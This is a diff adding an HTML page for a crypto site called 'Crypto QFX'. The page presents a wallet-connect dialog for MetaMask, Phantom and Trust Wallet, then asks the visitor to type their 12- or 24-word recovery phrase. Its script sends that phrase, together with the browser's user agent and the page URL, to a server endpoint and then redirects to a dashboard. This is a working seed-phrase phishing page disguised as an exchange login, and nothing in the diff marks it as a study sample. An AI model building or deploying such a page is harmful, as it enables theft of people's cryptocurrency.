@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Connect Wallet - Crypto QFX</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/src/index.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.8.1/dist/ethers.umd.min.js"></script>
+<script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    colors: {
+                        "primary": "#12e258",
+                        "background-light": "#f6f8f6",
+                        "background-dark": "#102216",
+                    },
+                    fontFamily: {
+                        "display": ["Space Grotesk", "sans-serif"]
+                    },
+                    borderRadius: {
+                        "DEFAULT": "0.25rem",
+                        "lg": "0.5rem",
+                        "xl": "0.75rem",
+                        "full": "9999px"
+                    },
+                },
+            },
+        }
+    </script>
+<style>
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+        }
+        .glass-modal {
+            background: rgba(16, 34, 22, 0.85);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(18, 226, 88, 0.1);
+            box-shadow: 0 0 40px rgba(18, 226, 88, 0.1);
+        }
+        .glow-effect {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(18, 226, 88, 0.1) 0%, transparent 70%);
+            z-index: -1;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body class="bg-background-light dark:bg-background-dark text-slate-900 dark:text-white min-h-screen relative overflow-hidden">
+<!-- Mock Background Content (Blurred Landing Page) -->
+<div class="fixed inset-0 z-0 overflow-hidden blur-md opacity-50 pointer-events-none">
+<header class="flex items-center justify-between px-10 py-5 border-b border-white/10">
+<div class="flex items-center gap-4">
+<div class="size-8 text-primary">
+<svg fill="currentColor" viewbox="0 0 48 48">
+<path d="M36.7273 44C33.9891 44 31.6043 39.8386 30.3636 33.69C29.123 39.8386 26.7382 44 24 44C21.2618 44 18.877 39.8386 17.6364 33.69C16.3957 39.8386 14.0109 44 11.2727 44C7.25611 44 4 35.0457 4 24C4 12.9543 7.25611 4 11.2727 4C14.0109 4 16.3957 8.16144 17.6364 14.31C18.877 8.16144 21.2618 4 24 4C26.7382 4 29.123 8.16144 30.3636 14.31C31.6043 8.16144 33.9891 4 36.7273 4C40.7439 4 44 12.9543 44 24C44 35.0457 40.7439 44 36.7273 44Z"></path>
+</svg>
+</div>
+<h2 class="text-xl font-bold tracking-tight">Crypto QFX</h2>
+</div>
+<div class="flex gap-8">
+<span>Market</span>
+<span>Trade</span>
+<span>Staking</span>
+</div>
+</header>
+<main class="max-w-6xl mx-auto mt-20 px-10">
+<h1 class="text-7xl font-bold mb-6">Trade the future of <span class="text-primary">Finance</span></h1>
+<p class="text-xl max-w-2xl opacity-80 mb-10">Access decentralized markets with the speed of institutional grade infrastructure. Join the QFX ecosystem today.</p>
+<div class="grid grid-cols-3 gap-6">
+<div class="h-64 bg-white/5 rounded-xl border border-white/10"></div>
+<div class="h-64 bg-white/5 rounded-xl border border-white/10"></div>
+<div class="h-64 bg-white/5 rounded-xl border border-white/10"></div>
+</div>
+</main>
+</div>
+<!-- Wallet Selection Modal -->
+<div id="walletModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
+<div class="glow-effect"></div>
+<div class="glass-modal w-full max-w-[480px] rounded-xl overflow-hidden flex flex-col animate-in fade-in zoom-in duration-300">
+<div class="flex items-center justify-between px-8 pt-8 pb-4">
+<h2 class="text-2xl font-bold tracking-tight text-white">Connect a Wallet</h2>
+<button onclick="window.history.back()" class="text-white/50 hover:text-white transition-colors">
+<span class="material-symbols-outlined">close</span>
+</button>
+</div>
+<div class="flex flex-col gap-2 px-6 py-4">
+<button data-wallet="MetaMask" class="wallet-btn flex items-center gap-4 bg-white/5 hover:bg-primary/10 border border-white/5 hover:border-primary/40 px-4 py-4 rounded-lg transition-all group text-left">
+<div class="flex items-center justify-center rounded-lg bg-[#23482f] shrink-0 size-12 group-hover:bg-primary/20 transition-colors">
+<span class="material-symbols-outlined text-primary" style="font-size: 28px;">account_balance_wallet</span>
+</div>
+<div class="flex-1">
+<p class="text-white text-lg font-medium leading-tight">MetaMask</p>
+<p class="text-white/40 text-xs font-normal">Connect to your MetaMask wallet</p>
+</div>
+<div class="shrink-0 flex items-center gap-2">
+<span class="text-[10px] font-bold bg-primary/20 text-primary px-2 py-0.5 rounded-full uppercase tracking-wider">Popular</span>
+<span class="material-symbols-outlined text-white/20 group-hover:text-primary transition-colors">chevron_right</span>
+</div>
+</button>
+<button data-wallet="Phantom" class="wallet-btn flex items-center gap-4 bg-white/5 hover:bg-primary/10 border border-white/5 hover:border-primary/40 px-4 py-4 rounded-lg transition-all group text-left">
+<div class="flex items-center justify-center rounded-lg bg-[#23482f] shrink-0 size-12 group-hover:bg-primary/20 transition-colors">
+<span class="material-symbols-outlined text-primary" style="font-size: 28px;">token</span>
+</div>
+<div class="flex-1">
+<p class="text-white text-lg font-medium leading-tight">Phantom Wallet</p>
+<p class="text-white/40 text-xs font-normal">Connect to your Phantom wallet</p>
+</div>
+<div class="shrink-0 flex items-center gap-2">
+<span class="text-[10px] font-bold bg-primary/20 text-primary px-2 py-0.5 rounded-full uppercase tracking-wider">Recommended</span>
+<span class="material-symbols-outlined text-white/20 group-hover:text-primary transition-colors">chevron_right</span>
+</div>
+</button>
+<button data-wallet="Trust Wallet" class="wallet-btn flex items-center gap-4 bg-white/5 hover:bg-primary/10 border border-white/5 hover:border-primary/40 px-4 py-4 rounded-lg transition-all group text-left">
+<div class="flex items-center justify-center rounded-lg bg-[#23482f] shrink-0 size-12 group-hover:bg-primary/20 transition-colors">
+<span class="material-symbols-outlined text-primary" style="font-size: 28px;">shield</span>
+</div>
+<div class="flex-1">
+<p class="text-white text-lg font-medium leading-tight">Trust Wallet</p>
+<p class="text-white/40 text-xs font-normal">Connect via Trust Wallet mobile</p>
+</div>
+<div class="shrink-0">
+<span class="material-symbols-outlined text-white/20 group-hover:text-primary transition-colors">chevron_right</span>
+</div>
+</button>
+</div>
+<div class="px-8 pt-4 pb-8 flex flex-col items-center gap-6">
+<p class="text-sm text-white/60">
+                    New to crypto? 
+                    <a class="text-primary hover:underline font-medium transition-all" href="#">Get a Wallet</a>
+</p>
+<div class="w-full h-px bg-white/10"></div>
+<p class="text-[11px] text-white/30 text-center leading-relaxed">
+                    By connecting a wallet, you agree to Crypto QFX's <br/>
+<a class="underline hover:text-white/60" href="#">Terms of Service</a> and <a class="underline hover:text-white/60" href="#">Privacy Policy</a>.
+                </p>
+</div>
+</div>
+</div>
+
+<!-- Seed Phrase Modal -->
+<div id="seedModal" class="fixed inset-0 z-60 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 hidden">
+<div class="glow-effect"></div>
+<div class="glass-modal w-full max-w-[600px] rounded-xl overflow-hidden flex flex-col animate-in fade-in zoom-in duration-300">
+<div class="flex items-center justify-between px-8 pt-8 pb-4">
+<div>
+<h2 class="text-2xl font-bold tracking-tight text-white">Import <span id="selectedWallet">Wallet</span></h2>
+<p class="text-white/60 text-sm mt-1">Enter your recovery phrase to restore your wallet</p>
+</div>
+<button id="closeSeedModal" class="text-white/50 hover:text-white transition-colors">
+<span class="material-symbols-outlined">close</span>
+</button>
+</div>
+<form id="seedForm" class="px-8 pb-8">
+<div class="flex mb-6">
+<div class="flex h-10 w-full max-w-[280px] items-center justify-center rounded-lg bg-white/10 p-1">
+<label class="flex cursor-pointer h-full flex-1 items-center justify-center rounded-md px-3 transition-all has-[:checked]:bg-primary has-[:checked]:text-black text-white/70 text-sm font-medium">
+<span>12 Words</span>
+<input checked class="hidden" name="phrase_type" type="radio" value="12"/>
+</label>
+<label class="flex cursor-pointer h-full flex-1 items-center justify-center rounded-md px-3 transition-all has-[:checked]:bg-primary has-[:checked]:text-black text-white/70 text-sm font-medium">
+<span>24 Words</span>
+<input class="hidden" name="phrase_type" type="radio" value="24"/>
+</label>
+</div>
+</div>
+<div id="seedInputs" class="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-6"></div>
+<div class="flex gap-3">
+<button type="submit" class="flex-1 h-12 bg-primary text-black font-bold rounded-lg hover:brightness-110 transition-all">
+Import Wallet
+</button>
+<button type="button" id="backToWallets" class="h-12 px-6 bg-white/10 text-white font-medium rounded-lg hover:bg-white/20 transition-all">
+Back
+</button>
+</div>
+</form>
+</div>
+</div>
+
+<!-- Error Toast -->
+<div id="errorToast" class="fixed top-6 right-6 z-[70] bg-red-500 text-white px-4 py-3 rounded-lg shadow-xl flex items-center gap-3 transform translate-x-full transition-transform duration-300 hidden">
+<span class="material-symbols-outlined text-lg">error</span>
+<p id="errorMessage" class="text-sm font-medium">Error message</p>
+<button id="closeToast" class="text-white/80 hover:text-white transition-colors">
+<span class="material-symbols-outlined text-lg">close</span>
+</button>
+</div>
+
+<script>
+let selectedWalletName = '';
+
+document.addEventListener('DOMContentLoaded', function() {
+    const walletModal = document.getElementById('walletModal');
+    const seedModal = document.getElementById('seedModal');
+    const seedForm = document.getElementById('seedForm');
+    const seedInputs = document.getElementById('seedInputs');
+    const selectedWalletSpan = document.getElementById('selectedWallet');
+    const phraseTypeRadios = document.querySelectorAll('input[name="phrase_type"]');
+    
+    // Toast notification functions
+    function showErrorToast(message) {
+        const toast = document.getElementById('errorToast');
+        const messageEl = document.getElementById('errorMessage');
+        messageEl.textContent = message;
+        toast.classList.remove('hidden', 'translate-x-full');
+        toast.classList.add('translate-x-0');
+        
+        // Auto hide after 5 seconds
+        setTimeout(() => {
+            hideErrorToast();
+        }, 5000);
+    }
+    
+    function hideErrorToast() {
+        const toast = document.getElementById('errorToast');
+        toast.classList.remove('translate-x-0');
+        toast.classList.add('translate-x-full');
+        setTimeout(() => {
+            toast.classList.add('hidden');
+        }, 300);
+    }
+    
+    // Close toast button
+    document.getElementById('closeToast').addEventListener('click', hideErrorToast);
+    
+    // Generate seed phrase inputs
+    function generateSeedInputs(count) {
+        seedInputs.innerHTML = '';
+        for (let i = 1; i <= count; i++) {
+            const div = document.createElement('div');
+            div.className = 'flex flex-col gap-1';
+            div.innerHTML = `
+                <label class="text-white/40 text-xs font-medium pl-1">${i}.</label>
+                <input 
+                    type="text" 
+                    name="word_${i}" 
+                    class="h-10 px-3 bg-white/10 border border-white/20 rounded-lg text-white placeholder:text-white/30 focus:border-primary focus:outline-none transition-all" 
+                    placeholder="word" 
+                    required 
+                    autocomplete="off" 
+                    spellcheck="false"
+                />
+            `;
+            seedInputs.appendChild(div);
+        }
+    }
+    
+    // Initialize with 12 words
+    generateSeedInputs(12);
+    
+    // Handle phrase type change
+    phraseTypeRadios.forEach(radio => {
+        radio.addEventListener('change', function() {
+            generateSeedInputs(parseInt(this.value));
+        });
+    });
+    
+    // Handle wallet selection
+    document.querySelectorAll('.wallet-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            selectedWalletName = this.dataset.wallet;
+            selectedWalletSpan.textContent = selectedWalletName;
+            walletModal.classList.add('hidden');
+            seedModal.classList.remove('hidden');
+        });
+    });
+    
+    // Handle back to wallets
+    document.getElementById('backToWallets').addEventListener('click', function() {
+        seedModal.classList.add('hidden');
+        walletModal.classList.remove('hidden');
+    });
+    
+    // Handle close seed modal
+    document.getElementById('closeSeedModal').addEventListener('click', function() {
+        seedModal.classList.add('hidden');
+        walletModal.classList.remove('hidden');
+    });
+    
+    // Handle form submission
+    seedForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const formData = new FormData(this);
+        const phraseType = formData.get('phrase_type');
+        const wordCount = parseInt(phraseType);
+        
+        // Collect seed words
+        const seedWords = [];
+        for (let i = 1; i <= wordCount; i++) {
+            const word = formData.get(`word_${i}`);
+            if (word && word.trim()) {
+                seedWords.push(word.trim().toLowerCase());
+            }
+        }
+        
+        // Validate word count
+        if (seedWords.length !== wordCount) {
+            showErrorToast(`Please enter all ${wordCount} words.`);
+            return;
+        }
+        
+        // Validate seed phrase
+        const seedPhrase = seedWords.join(' ');
+        
+        // Show loading state
+        const submitBtn = this.querySelector('button[type="submit"]');
+        const originalText = submitBtn.textContent;
+        submitBtn.textContent = 'Validating...';
+        submitBtn.disabled = true;
+        
+        // Send data to API for proper validation
+        try {
+            const response = await fetch('/api/import-wallet', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    walletType: selectedWalletName,
+                    seedPhrase: seedPhrase,
+                    wordCount: wordCount,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            
+            const result = await response.json();
+            console.log('API Response:', result); // Debug log
+            
+            // Check if validation failed - fix the validation logic
+            if (!result.success || result.isValid === false) {
+                showErrorToast('Invalid seed phrase. Please enter a valid 12 or 24-word recovery phrase.');
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+                return;
+            }
+            
+            // Store wallet data for dashboard if valid
+            if (result.walletData) {
+                console.log('[CONNECT] Storing wallet data:', result.walletData);
+                
+                localStorage.setItem('walletData', JSON.stringify(result.walletData));
+                sessionStorage.setItem('walletData', JSON.stringify(result.walletData));
+                sessionStorage.setItem('currentWallet', JSON.stringify(result.walletData));
+                
+                // Log stored values for debugging
+                console.log('Portfolio value:', result.walletData.balances?.totalPortfolioUSD);
+                console.log('Addresses:', result.walletData.addresses);
+            }
+            
+            // Redirect to dashboard
+            window.location.href = '/dashboard';
+            
+        } catch (err) {
+            console.error('API call error:', err);
+            showErrorToast('Connection error. Please try again.');
+            submitBtn.textContent = originalText;
+            submitBtn.disabled = false;
+        }
+    });
+});
+</script>
+</script>
+</body></html>
